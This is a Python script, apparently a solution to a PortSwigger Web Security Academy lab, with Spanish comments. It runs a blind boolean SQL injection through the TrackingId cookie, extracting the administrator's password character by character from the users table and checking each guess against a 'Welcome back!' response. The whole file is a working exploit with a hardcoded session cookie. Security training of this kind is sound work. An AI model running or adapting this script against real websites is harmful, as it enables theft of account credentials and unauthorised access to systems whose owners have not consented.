import requests
import string
from bs4 import BeautifulSoup

url = 'https://0ad80001046778b880c5da0d00a300b5.web-security-academy.net/filter?category=Pets'

# Caracteres alfanumÃ©ricos
alfanumericos = string.ascii_letters + string.digits

# Variable para almacenar la contraseÃ±a
password = ''


for i in range(1,32):  # Longitud de la contraseÃ±a, ajusta segÃºn sea necesario
    found = False
    for caracter in alfanumericos:
        # Crear el encabezado con el caracter actual y la contraseÃ±a actual
        headers = {
            'Host': '0ad80001046778b880c5da0d00a300b5.web-security-academy.net',
            'Cookie': f"TrackingId=0wdjthqJJGhDt8T0' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{caracter}; session=NiwAwxl0MN1FDhDRIAZORaJ1LnOhu17Q"
        }

        # Realizar la solicitud GET
        response = requests.get(url , headers=headers)
        
        print(headers)
        # Obtener el contenido HTML de la respuesta
        html_content = response.text
                    
        # Analizar el HTML utilizando BeautifulSoup
        soup = BeautifulSoup(html_content, 'html.parser')
        
        #Busco si esta el string
        welcome_back = soup.find(string='Welcome back!')

        # Verificar la respuesta
        if welcome_back:
            password += caracter
            found = True
            break
            
    if not found:
        break

print("Contraseña encontrada:", password)
